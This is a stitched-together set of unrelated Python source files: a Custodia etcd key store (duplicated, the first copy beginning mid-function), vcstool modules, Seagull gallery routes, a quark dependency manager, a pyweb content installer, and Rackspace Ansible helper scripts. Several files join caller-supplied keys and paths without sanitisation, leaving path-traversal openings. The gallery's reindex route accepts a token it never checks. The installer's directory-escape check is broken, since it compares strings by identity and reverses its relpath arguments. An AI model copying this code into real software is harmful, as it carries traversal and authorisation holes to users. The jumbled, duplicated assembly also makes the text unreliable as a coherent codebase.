            log_error("Error listing %s: [%r]" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(os.path.join(self.namespace, key))                    
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error("Error removing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True

# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import os
import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', "/custodia")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error("Error creating namespace %s: [%r]" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def get(self, key):
        try:
            result = self.etcd.get(os.path.join(self.namespace, key))                    
        except etcd.EtcdException as err:
            log_error("Error fetching key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = os.path.join(self.namespace, key)                    
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error("Error storing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = os.path.join(self.namespace, key)                    
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error("Error storing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = os.path.join(self.namespace, keyfilter)                    
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error("Error listing %s: [%r]" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(os.path.join(self.namespace, key))                    
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error("Error removing key %s: [%r]" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True

import os


class Command(object):

    def __init__(self, args):
        self.debug = args.debug
        self.path = args.path                    
        self.repos = args.repos                    

    def get_command_line(self, client):
        raise NotImplementedError()


def add_common_arguments(parser):
    group = parser.add_argument_group('Common parameters')
    group.add_argument('--debug', action='store_true', default=False, help='Show debug messages')
    group.add_argument('--repos', action='store_true', default=False, help='List repositories which the command operates on')
    group.add_argument('path', nargs='?', default=os.curdir, help='Base path to look for repositories')                    

import os

from . import vcstool_clients


def find_repositories(path):                    
    repos = []
    client = get_vcs_client(path)
    if client:
        repos.append(client)
    else:
        try:
            listdir = os.listdir(path)
        except OSError:
            listdir = []
        for name in listdir:
            subpath = os.path.join(path, name)
            if not os.path.isdir(subpath):
                continue
            repos += find_repositories(subpath)                    
    return repos                    


def get_vcs_client(path):
    for vcs_type in vcstool_clients:
        if vcs_type.is_repository(path):
            return vcs_type(path)
    return None

import os
import subprocess
import sys

from .crawler import find_repositories


def execute(command):
    # determine repositories
    clients = find_repositories(command.path)                    
    if command.repos:                    
        ordered_clients = dict((client.path, client) for client in clients)
        for k in sorted(ordered_clients.keys()):
            client = ordered_clients[k]
            print('%s (%s)' % (k, client.type))

    jobs = {}
    for client in clients:
        # generate command line
        cmd = command.get_command_line(client)
        job = {'client': client, 'cmd': cmd}
        if not cmd:
            cmd = ['echo', '"%s" is not implemented for client "%s"' % (command.__class__.__name__, client.type)]
        if command.debug:
            print('Executing shell command "%s" in "%s"' % (' '.join(cmd), client.path))
        # execute command line
        p = subprocess.Popen(cmd, shell=False, cwd=os.path.abspath(client.path), stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        job['process'] = p
        jobs[p.pid] = job

    # wait for all jobs to finish
    wait_for = jobs.keys()
    while wait_for:
        # wait for any/next process
        try:  # if os.name == 'posix':
            pid, retcode = os.wait()
        except AttributeError:
            pid, retcode = os.waitpid(wait_for[0], 0)
        # collect retcode and output
        if pid in wait_for:
            wait_for.remove(pid)
            job = jobs[pid]
            job['retcode'] = retcode
            job['stdout'] = job['process'].stdout.read()
            # indicate progress
            if len(jobs) > 1:
                if job['cmd']:
                    if retcode == 0:
                        sys.stdout.write('.')
                    else:
                        sys.stdout.write('E')
                else:
                    sys.stdout.write('s')
                sys.stdout.flush()
    if len(jobs) > 1:
        print('')  # finish progress line

    # output results in alphabetic order
    path_to_pid = {job['client'].path: pid for pid, job in jobs.items()}
    pids_in_order = [path_to_pid[path] for path in sorted(path_to_pid.keys())]
    for pid in pids_in_order:
        job = jobs[pid]
        client = job['client']
        print(ansi('bluef') + '=== ' + ansi('boldon') + client.path + ansi('boldoff') + ' (' + client.type + ') ===' + ansi('reset'))
        output = job['stdout'].rstrip()
        if job['retcode'] != 0:
            if not output:
                output = 'Failed with retcode %d' % job['retcode']
            output = ansi('redf') + output + ansi('reset')
        elif not job['cmd']:
            output = ansi('yellowf') + output + ansi('reset')
        if output:
            print(output)


def ansi(keyword):
    codes = {
        'bluef': '\033[34m',
        'boldon': '\033[1m',
        'boldoff': '\033[22m',
        'redf': '\033[31m',
        'reset': '\033[0m',
        'yellowf': '\033[33m',
    }
    if keyword in codes:
        return codes[keyword]
    return ''

#
# Seagull photo gallery app
# Copyright (C) 2016  Hajime Yamasaki Vukelic
#
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details.
#

from bottle import static_file

from streamline import NonIterableRouteBase


class Static(NonIterableRouteBase):
    path = '/static/<path:path>'

    def get_base_path(self):                    
        return self.config['runtime.static_dir']                    

    def get(self, path):
        return static_file(path, self.get_base_path())                    

#
# Seagull photo gallery app
# Copyright (C) 2016  Hajime Yamasaki Vukelic
#
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details.
#

from .app import Static
from ..app.templating import TemplateRoute
from ..gallery.pager import Pager


class Main(TemplateRoute):
    """
    Main page
    """
    path = '/'
    template_name = 'main.mako'

    @property
    def current_page(self):
        try:
            return int(self.request.query['page'])
        except (KeyError, ValueError, TypeError):
            return 1

    def get(self):
        index = self.config['runtime.gallery']
        pager = Pager(index, self.current_page)
        return {'pager': pager}


class Image(Static):
    path = '/gallery/<path:path>'

    def get_base_path(self):                    
        return self.config['runtime.gallery_dir']


class Reindex(TemplateRoute):
    path = '/reindex/<token>'
    template_name = 'reset.mako'

    def get(self, token):
        index = self.config['runtime.gallery']
        index.rescan()
        return {}

import logging
import json
import os
from os.path import exists, join, isdir
from shutil import rmtree
from subprocess import call, PIPE, Popen, CalledProcessError, run
from urllib.parse import urlparse
import shutil

import xml.etree.ElementTree as ElementTree

from quark.utils import DirectoryContext as cd, fork, log_check_output
from quark.utils import freeze_file, dependency_file, mkdir, load_conf

logger = logging.getLogger(__name__)

class QuarkError(RuntimeError):
    pass

def url_from_directory(directory, include_commit = True):
    if exists(join(directory, ".svn")):
        cls = SvnSubproject
    elif exists(join(directory, ".git")):
        cls = GitSubproject
    else:
        raise QuarkError("Couldn't detect repository type for directory %s" % directory)
    return cls.url_from_directory(directory, include_commit)

def not_a_project(directory, proj_type):
    raise QuarkError("""

Directory '%s' isn't a %s sandbox,
but it's marked as such in a subproject.quark.

Either:
- it was previously a subproject of a different kind (e.g. the catalog changed
  it from Subversion to Git);
- it's committed in the root project;
- it's a local modification.

Please remove it and re-run quark up.
""" % (directory, proj_type))



class Subproject:
    @staticmethod
    def _parse_fragment(url):
        res = {}
        for equality in url.fragment.split():
            index = equality.find('=')
            key = equality[:index]
            value = equality[index + 1:]
            res[key] = value
        return res

    @staticmethod
    def create(name, urlstring, directory, options, conf = {}, **kwargs):
        url = urlparse(urlstring)
        args = (name, url, directory, options, conf)
        if urlstring is None:
            # fake project, used for non-versioned root
            res = Subproject(name, directory, options, conf, **kwargs)
        elif url.scheme.startswith('git'):
            res = GitSubproject(*args, **kwargs)
        elif url.scheme.startswith('svn'):
            res = SvnSubproject(*args, **kwargs)
        else:
            raise ValueError("Unrecognized dependency for url '%s'", urlstring)
        res.urlstring = urlstring
        return res

    @staticmethod
    def create_dependency_tree(source_dir, url=None, options=None, update=False):
        source_dir_rp = os.path.realpath(source_dir)                    
        root = Subproject.create("root", url, source_dir, {}, {}, toplevel = True)
        if url and update:
            root.checkout()
        conf = load_conf(source_dir)
        if conf is None:
            return root, {}
        subproject_dir = join(source_dir, conf.get("subprojects_dir", 'lib'))
        stack = [root]
        modules = {}

        def get_option(key):
            try:
                return root.options[key]
            except KeyError as e:
                err = e
            for module in modules.values():
                try:
                    return module.options[key]
                except KeyError as e:
                    err = e
            raise err

        def add_module(parent, name, uri, options, conf, **kwargs):
            if uri is None:
                # options add only, lookup from existing modules
                uri = modules[name].urlstring
            target_dir = join(subproject_dir, name)
            target_dir_rp = os.path.realpath(target_dir)                    
            if not target_dir_rp.startswith(source_dir_rp):
                raise QuarkError("""
Subproject `%s` (URI: %s)
is trying to escape from the main project directory (`%s`)
subproject realpath:   %s
main project realpath: %s""" % (name, uri, source_dir, target_dir_rp, source_dir_rp))
            newmodule = Subproject.create(name, uri, target_dir, options, conf, **kwargs)
            mod = modules.setdefault(name, newmodule)
            if mod is newmodule:
                mod.parents.add(parent)
                if update:
                    mod.update()
            else:
                if newmodule.exclude_from_cmake != mod.exclude_from_cmake:
                    children_conf = [join(parent.directory, dependency_file) for parent in mod.parents]
                    parent_conf = join(parent.directory, dependency_file)
                    raise ValueError("Conflicting value of 'exclude_from_cmake'"
                                     " attribute for module '%s': %r required by %s and %r required by %s" %
                                     (name, mod.exclude_from_cmake, children_conf, newmodule.exclude_from_cmake,
                                      parent_conf)
                                     )
                if not newmodule.same_checkout(mod) and uri is not None:
                    children = [join(parent.directory, dependency_file) for parent in mod.parents]
                    parent = join(parent.directory, dependency_file)
                    raise ValueError(
                        "Conflicting URLs for module '%s': '%s' required by %s and '%s' required by '%s'" %
                        (name,
                         mod.urlstring, children,
                         newmodule.urlstring, parent))

                else:
                    for key, value in options.items():
                        mod.options.setdefault(key, value)
                        if mod.options[key] != value:
                            raise ValueError(
                                "Conflicting values option '%s' of module '%s'" % (key, mod.name)
                            )
            stack.append(mod)
            parent.children.add(mod)

        freeze_conf = join(root.directory, freeze_file)
        if exists(freeze_conf):
            with open(freeze_conf, 'r') as f:
                freeze_dict = json.load(f)
        else:
            freeze_dict = {}
        if update:
            mkdir(subproject_dir)
        while len(stack):
            current_module = stack.pop()
            if current_module.external_project:
                generate_cmake_script(current_module.directory, update = update)
                continue
            conf = load_conf(current_module.directory)
            if conf:
                if current_module.toplevel:
                    current_module.options = conf.get('toplevel_options', {})
                    if options:
                        current_module.options.update(options)
                for name, depobject in conf.get('depends', {}).items():
                    external_project = depobject.get('external_project', False)
                    add_module(current_module, name,
                               freeze_dict.get(name, depobject.get('url', None)), depobject.get('options', {}),
                               depobject,
                               exclude_from_cmake=depobject.get('exclude_from_cmake', external_project),
                               external_project=external_project,
                               )
                for key, optobjects in conf.get('optdepends', {}).items():
                    if isinstance(optobjects, dict):
                        optobjects = [optobjects]
                    for optobject in optobjects:
                        try:
                            value = get_option(key)
                        except KeyError:
                            continue
                        if value == optobject['value']:
                            for name, depobject in optobject['depends'].items():
                                add_module(current_module, name,
                                           freeze_dict.get(name, depobject.get('url', None)),
                                           depobject.get('options', {}),
                                           depobject)
        return root, modules

    def __init__(self, name=None, directory=None, options=None, conf = {}, exclude_from_cmake=False, external_project=False, toplevel = False):
        self.conf = conf
        self.parents = set()
        self.children = set()
        self.name = name
        self.directory = directory
        self.options = options or {}
        self.exclude_from_cmake = exclude_from_cmake
        self.external_project = external_project
        self.toplevel = toplevel

    def __hash__(self):
        return self.name.__hash__()

    def same_checkout(self, other):
        return True

    def checkout(self):
        raise NotImplementedError()

    def update(self):
        raise NotImplementedError()

    def status(self):
        print("Unsupported external %s" % self.directory)

    def local_edit(self):
        raise NotImplementedError()

    def url_from_checkout(self, *args, **kwargs):
        return self.url_from_directory(directory = self.directory, *args, **kwargs)

    def mirror(self, dest):
        raise NotImplementedError()

    def toJSON(self):
        return {
            "name": self.name,
            "children": [child.toJSON() for child in self.children],
            "options": self.options,
        }


class GitSubproject(Subproject):
    def __init__(self, name, url, directory, options, conf = {}, **kwargs):
        super().__init__(name, directory, options, conf, **kwargs)
        self.ref_is_commit = False
        self.ref = 'origin/HEAD'
        if url.fragment:
            fragment = Subproject._parse_fragment(url)
            if 'commit' in fragment:
                self.ref = fragment['commit']
                self.ref_is_commit = True
            elif 'tag' in fragment:
                self.ref = fragment['tag']
            elif 'branch' in fragment:
                self.ref = 'origin/%s' % fragment['branch']
        self.url = url._replace(fragment='')._replace(scheme=url.scheme.replace('git+', ''))

    def same_checkout(self, other):
        if isinstance(other, GitSubproject) and (self.url, self.ref, self.conf.get("shallow", False)) == (other.url, other.ref, other.conf.get("shallow", False)):
            return True
        return False

    def check_origin(self):
        with cd(self.directory):
            if log_check_output(['git', 'config', '--get', 'remote.origin.url']) != self.url:
                if not self.has_local_edit():
                    logger.warning("%s is not a clone of %s "
                                   "but it hasn't local modifications, "
                                   "removing it..", self.directory, self.url.geturl())
                    rmtree(self.directory)
                    self.checkout()
                else:
                    raise ValueError(
                        "'%s' is not a clone of '%s' and has local"
                        " modifications, I don't know what to do with it..." %
                        self.directory, self.url.geturl())

    def noremote_ref(self):
        nr_ref = self.ref
        if '/' in nr_ref:
            nr_ref = nr_ref.split('/', 1)[1]
        return nr_ref


    def checkout(self):
        shallow = self.conf.get("shallow", False)

        if self.ref_is_commit and shallow:
            # We cannot straight clone a shallow repo using a commit hash (-b doesn't support it)
            # do the dance described at https://stackoverflow.com/a/43136160/214671
            os.mkdir(self.directory)
            with cd(self.directory):
                fork(['git', 'init'])
                fork(['git', 'remote', 'add', 'origin', self.url.geturl()])
                fork(['git', 'fetch', '--depth', '1', 'origin', self.noremote_ref()])
                fork(['git', 'checkout', self.ref])
        else:
            # Regular case
            extra_opts = []
            if shallow:
                extra_opts += ["--depth", "1"]
            # Needed essentially for the shallow case, as for full clones the
            # git clone -n + git checkout would suffice
            if not self.ref_is_commit and self.ref != 'origin/HEAD':
                extra_opts += ['-b', self.noremote_ref()]
            fork(['git', 'clone', '-n'] + extra_opts + ['--', self.url.geturl(), self.directory])
            with cd(self.directory):
                fork(['git', 'checkout', self.ref, '--'])

    def update(self):
        if not exists(self.directory):
            self.checkout()
        elif not exists(self.directory + "/.git"):
            not_a_project(self.directory, "Git")
        elif self.has_local_edit():
            logger.warning("Directory '%s' contains local modifications" % self.directory)
        else:
            with cd(self.directory):
                if self.conf.get("shallow", False):
                    # Fetch just the commit we need
                    fork(['git', 'fetch', '--depth', '1', 'origin', self.noremote_ref()])
                    # Notice that we need FETCH_HEAD, as the shallow clone does not recognize
                    # origin/HEAD & co.
                    fork(['git', 'checkout', 'FETCH_HEAD', '--'])
                else:
                    fork(['git', 'fetch'])
                    fork(['git', 'checkout', self.ref, '--'])

    def status(self):
        fork(['git', "--git-dir=%s/.git" % self.directory, "--work-tree=%s" % self.directory, 'status'])

    def has_local_edit(self):
        with cd(self.directory):
            return log_check_output(['git', 'status', '--porcelain']) != b""

    @staticmethod
    def url_from_directory(directory, include_commit = True):
        with cd(directory):
            origin = log_check_output(['git', 'remote', 'get-url', 'origin'], universal_newlines=True)[:-1]
            commit = log_check_output(['git', 'log', '-1', '--format=%H'], universal_newlines=True)[:-1]
        ret = 'git+%s' % (origin,)
        if include_commit:
            ret += '#commit=%s' % (commit,)
        return ret

    def mirror(self, dst_dir):
        source_dir = self.directory
        def mkdir_p(path):
            if path.strip() != '' and not os.path.exists(path):
                os.makedirs(path)

        env = os.environ.copy()
        env['LC_MESSAGES'] = 'C'

        def tracked_files():
            p = Popen(['git', 'ls-tree', '-r', '--name-only', 'HEAD'], stdout=PIPE, env=env)
            out = p.communicate()[0]
            if p.returncode != 0 or not out.strip():
                return None
            return [e.strip() for e in out.splitlines() if os.path.exists(e)]

        def cp(src, dst):
            r, f = os.path.split(dst)
            mkdir_p(r)
            shutil.copy2(src, dst)

        with cd(source_dir):
            for t in tracked_files():
                cp(t, os.path.join(dst_dir, t.decode()))

class SvnSubproject(Subproject):
    def __init__(self, name, url, directory, options, conf = {}, **kwargs):
        super().__init__(name, directory, options, conf = {}, **kwargs)
        self.rev = 'HEAD'
        fragment = (url.fragment and Subproject._parse_fragment(url)) or {}
        rev = fragment.get('rev', None)
        branch = fragment.get('branch', None)
        tag = fragment.get('tag', None)
        if (branch or tag) and self.url.path.endswith('trunk'):
            url = url._replace(path=self.url.path[:-5])
        if branch:
            url = url._replace(path=join(url.path, 'branches', branch))
        elif tag:
            url = url._replace(path=join(url.path, 'tags', tag))
        if rev:
            url = url._replace(path=url.path + '@' + rev)
            self.rev = rev
        self.url = url._replace(fragment='')

    def same_checkout(self, other):
        if isinstance(other, SvnSubproject) and (self.url, self.rev) == (other.url, other.rev):
            return True
        return False

    def checkout(self):
        fork(['svn', 'checkout', self.url.geturl(), self.directory])

    def update(self):
        if not exists(self.directory):
            self.checkout()
        elif not exists(self.directory + "/.svn"):
            not_a_project(self.directory, "Subversion")
        elif self.has_local_edit():
            logger.warning("Directory '%s' contains local modifications" % self.directory)
        else:
            with cd(self.directory):
                # svn switch _would be ok_ even just to perform an update, but,
                # unlike svn up, it touches the timestamp of all the files,
                # forcing full rebuilds; so, if we are already on the correct
                # url just use svn up

                # Notice that, unlike other svn commands, -r in svn up works as
                # a peg revision (the @ syntax), so it takes the URL of the
                # current working copy and looks it up in the repository _as it
                # was at the requested revision_ (or HEAD if none is specified)
                target_base,target_rev = (self.url.geturl().split('@') + [''])[:2]
                if target_base == self.url_from_checkout(include_commit = False):
                    fork(['svn', 'up'] + (["-r" + target_rev] if target_rev else []))
                else:
                    fork(['svn', 'switch', self.url.geturl()])

    def status(self):
        fork(['svn', 'status', self.directory])

    def has_local_edit(self):
        xml = log_check_output(['svn', 'st', '--xml', self.directory], universal_newlines=True)
        doc = ElementTree.fromstring(xml)
        for entry in doc.findall('./status/target/entry[@path="%s"]/entry[@item="modified"]' % self.directory):
            return True
        return False

    @staticmethod
    def url_from_directory(directory, include_commit = True):
        xml = log_check_output(['svn', 'info', '--xml', directory], universal_newlines=True)
        doc = ElementTree.fromstring(xml)
        ret = doc.findall('./entry/url')[0].text
        if include_commit:
            ret += "@" + doc.findall('./entry/commit')[0].get('revision')
        return ret

    def mirror(self, dst, quick = False):
        import shutil
        src = self.directory

        os.chdir(src)
        if not quick and isdir(dst):
            shutil.rmtree(dst)
        if not isdir(dst):
            os.makedirs(dst)

        # Forziamo il locale a inglese, perch parseremo l'output di svn e non
        # vogliamo errori dovuti alle traduzioni.
        env = os.environ.copy()
        env["LC_MESSAGES"] = "C"

        dirs = ["."]

        # Esegue svn info ricorsivamente per iterare su tutti i file versionati.
        for D in dirs:
            infos = {}
            for L in Popen(["svn", "info", "--recursive", D], stdout=PIPE, env=env).stdout:
                L = L.decode()
                if L.strip():
                    k,v = L.strip().split(": ", 1)
                    infos[k] = v
                else:
                    if infos["Schedule"] == "delete":
                        continue
                    fn = infos["Path"]
                    infos = {}
                    if fn == ".":
                        continue
                    fn1 = join(src, fn)
                    fn2 = join(dst, fn)
                    if isdir(fn1):
                        if not isdir(fn2):
                            os.makedirs(fn2)
                    elif not quick or newer(fn1, fn2):
                        shutil.copy2(fn1, fn2)

def generate_cmake_script(source_dir, url=None, options=None, print_tree=False,update=True):
    root, modules = Subproject.create_dependency_tree(source_dir, url, options, update=update)
    if print_tree:
        print(json.dumps(root.toJSON(), indent=4))
    conf = load_conf(source_dir)
    if update and conf is not None:
        subproject_dir = join(source_dir, conf.get("subprojects_dir", 'lib'))

        cmakelists_rows = []
        processed = set()

        def dump_options(module):
            for key, value in sorted(module.options.items()):
                if value is None:
                    cmakelists_rows.append('unset(%s CACHE)\n' % (key))
                    continue
                elif isinstance(value, bool):
                    kind = "BOOL"
                    value = 'ON' if value else 'OFF'
                else:
                    kind = "STRING"
                cmakelists_rows.append('set(%s %s CACHE INTERNAL "" FORCE)\n' % (key, value))

        def process_module(module):
            # notice: if a module is marked as excluded from cmake we also
            # exclude its dependencies; they are nonetheless included if they
            # are required by another module which is not excluded from cmake
            if module.name in processed or module.exclude_from_cmake:
                return
            processed.add(module.name)
            # first add the dependent modules
            # module.children is a set, whose iteration order changes from run to run
            # make this deterministic (we want to generate always the same CMakeLists.txt)
            for c in sorted(module.children, key = lambda x: x.name):
                process_module(c)
            # dump options and add to the generated CMakeLists.txt
            dump_options(module)
            if module is not root and exists(join(module.directory, "CMakeLists.txt")):
                cmakelists_rows.append('add_subdirectory(%s)\n' % (module.directory))

        process_module(root)

        # write only if different
        cmakelists_data = ''.join(cmakelists_rows)
        try:
            with open(join(subproject_dir, 'CMakeLists.txt'), 'r') as f:
                if cmakelists_data == f.read():
                    # nothing to do, avoid touching the file (which often yields a full rebuild)
                    return
        except IOError:
            pass
        # actually write the file
        with open(join(subproject_dir, 'CMakeLists.txt'), 'w') as f:
            f.write(cmakelists_data)


#!/usr/bin/env python3

import argparse
import logging
import os
import shutil

from .pyweb import (# DEFAULT_PYWEB_HOME,
                    # DEFAULT_PYWEB_VAR,
                    DEFAULT_PYWEB_CONTENT_DIR,
                    DEFAULT_PYWEB_LOG_DIR)


class ContentInstallerException(Exception):
    pass

class ContentInstaller:
    def __init__(self, src_path, dst_path, www_root, logger=None):
        self.logger = logger or logging.getLogger("ContentInstaller")
        _src, _dst, _www = self._sanity_check_path(src_path, dst_path, www_root)
        self.src_path = _src
        self.dst_path = _dst
        self.www_root = _www


    def _sanity_check_path(self, src, dst, www_root):
        logger = self.logger
        if not os.path.isdir(src):
            msg = "Source path: %s does not exist or is not a directory." % src
            logger.critical(msg)
            raise ContentInstallerException(msg)

        if not os.path.isdir(www_root):
            msg = "Web root % s does not exist or is not a directory." % src
            logger.critical(msg)
            raise ContentInstallerException(msg)

        www_root_abs = os.path.abspath(www_root)

        rel_dst = dst
        if os.path.isabs(dst):
            _root = os.path.commonprefix([www_root_abs, dst])                    
            if _root is not www_root_abs:
                msg = "Destination path is absolute and is not a subdirectory of web root. {}".format([www_root, dst])
                logger.critical(msg)
                raise ContentInstallerException(msg)
            rel_dst = os.path.relpath(www_root_abs, dst)                    
        else:
            _dst = os.path.join(www_root_abs, dst)
            _dst = os.path.realpath(_dst)
            _root = os.path.commonprefix([www_root_abs, _dst])
            if _root is not www_root_abs:
                msg = "Destination is a relative path that resolves outside of web root. {}".format([www_root_abs, dst])
                logger.critical(msg)
                raise ContentInstallerException(msg)
            rel_dst = os.path.relpath(www_root_abs, _dst)                    

        abs_dst = os.path.join(www_root_abs, rel_dst)
        if os.path.exists(abs_dst):
            msg = "Destination directory already exists: {}".format(abs_dst)
            logger.critical(msg)
            raise ContentInstallerException(msg)

        return (src, rel_dst, www_root_abs)

    def install(self):
        logger = self.logger
        src_path = self.src_path
        dst_path = os.path.join(self.www_root, self.dst_path)
        logger.info("Copying %s to %s" % (src_path, dst_path))
        try:
            shutil.copytree(src_path, dst_path, symlinks=True)
        except Exception as e:
            logger.critical("Exception: {}".format(e))
            raise


def parse_args(argv):
    parser = argparse.ArgumentParser()

    parser.add_argument("content_src_dir", help="Source directory containing content to be intalled.")
    parser.add_argument("content_dst_dir", help="Name of directory under <WWW-ROOT> for content to be located.")
    parser.add_argument("--www-root", help="WWW root path to install to.")
    parser.add_argument("--log-path", help="Directory to write logfiles to.")
    args = parser.parse_args(argv)

    return args


def main(argv):
    args = parse_args(argv)
    src_dir = args.content_src_dir
    dst_dir = args.content_dst_dir

    www_root = args.www_root or DEFAULT_PYWEB_CONTENT_DIR
    logpath = args.log_path or DEFAULT_PYWEB_LOG_DIR

    logging.basicConfig(filename=os.path.join(logpath, "pyweb-installer.log"), level=logging.DEBUG)

    logger = logging.getLogger("pyweb-installer")
    print("Installing %s" % src_dir)
    print("Logging to %s" % os.path.join(logpath, "pyweb-installer.log"))
    try:
        installer = ContentInstaller(src_dir, dst_dir, www_root, logger=logger)
        installer.install()
    except Exception as e:
        print("Installation failed: %s" % str(e))
        logger.critical("Installation failed.")
        exit(1)

    print("Installation complete.")
    logger.info("Installation complete.")

#!/usr/bin/env python2.7
#
# Copyright 2016, Rackspace US, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# (c) 2016, Jesse Pretorius <jesse.pretorius@rackspace.co.uk>
#


"""Read/write ansible-role-requirements.yml content from the CLI."""


from __future__ import print_function

import argparse
import yaml


# To ensure that the dicts are always output in the same order
# we setup a representation for dict objects and register it
# with the yaml class.
def represent_dict(self, data):
    def key_function((key, value)):
        # Prioritizes certain keys when sorting.
        prio = {"model": 0, "pk": 1, "fields": 2}.get(key, 99)
        return (prio, key)
    items = data.items()
    items.sort(key=key_function)
    return self.represent_mapping(u'tag:yaml.org,2002:map', items)

yaml.add_representer(dict, represent_dict)


def main():
    """Run the main application."""

    # Setup argument parsing
    parser = argparse.ArgumentParser(
        description='ansible-role-requirements.yml CLI editor',
        epilog='Licensed "Apache 2.0"')

    parser.add_argument(
        '-f',
        '--file',
        help='<Required> ansible-role-requirements.yml file location',
        required=True
    )

    parser.add_argument(
        '-n',
        '--name',
        help='<Optional> The name of the Ansible role to edit',
        required=False
    )

    parser.add_argument(
        '-v',
        '--version',
        help='<Required> The version to set for the Ansible role',
        required=True
    )

    parser.add_argument(
        '-s',
        '--src',
        help='<Optional> The source URL to identify the, or set for the Ansible role',
        required=False
    )

    # Parse arguments
    args = parser.parse_args()

    # Read the ansible-role-requirements.yml file into memory
    with open(args.file, "r") as role_req_file:                    
        reqs = yaml.safe_load(role_req_file)

    # Loop through the list to find the applicable role
    for role_data in reqs:
        if args.name:
            if role_data['name'] == args.name:
                # Change the specified role data
                role_data['version'] = args.version
                if args.src:
                    role_data['src'] = args.src
        elif args.src:
           if role_data['src'] == args.src:
                # Change the specified role data
                role_data['version'] = args.version

    # Write out the resulting file
    with open(args.file, "w") as role_req_file:                    
        try:
            yaml.dump(reqs, role_req_file, default_flow_style=False)
        except yaml.YAMLError as exc:
            print(exc)

if __name__ == "__main__":
    main()

#!/usr/bin/env python2.7
#
# Copyright 2016, Rackspace US, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# (c) 2016, Jesse Pretorius <jesse.pretorius@rackspace.co.uk>
#


"""Read current version from ansible-role-requirements.yml content from the CLI."""


#from __future__ import print_function

import argparse
import yaml


def main():
    """Run the main application."""

    # Setup argument parsing
    parser = argparse.ArgumentParser(
        description='ansible-role-requirements.yml CLI reader',
        epilog='Licensed "Apache 2.0"')

    parser.add_argument(
        '-f',
        '--file',
        help='<Required> ansible-role-requirements.yml file location',
        required=True
    )

    parser.add_argument(
        '-n',
        '--name',
        help='<Optional> The name of the Ansible role to edit',
        required=False
    )

    parser.add_argument(
        '-s',
        '--src',
        help='<Optional> The source URL to identify the, or set for the Ansible role',
        required=False
    )

    # Parse arguments
    args = parser.parse_args()

    # Read the ansible-role-requirements.yml file into memory
    with open(args.file, "r") as role_req_file:                    
        reqs = yaml.safe_load(role_req_file)

    # Loop through the list to find the applicable role
    for role_data in reqs:
        if args.name:
            if role_data['name'] == args.name:
                print role_data['version']
        elif args.src:
           if role_data['src'] == args.src:
                print role_data['version']


if __name__ == "__main__":
    main()

################################################################################
#                                                                              #
#  output.py                                                                   #
#  preserve files and metrics output by running a job                          #
#                                                                              #                                                                              #
#  $HeadURL$                                                                   #
#  $Id$                                                                        #
#                                                                              #
#  --------------------------------------------------------------------------- #
#  Part of HPCToolkit (hpctoolkit.org)                                         #
#                                                                              #
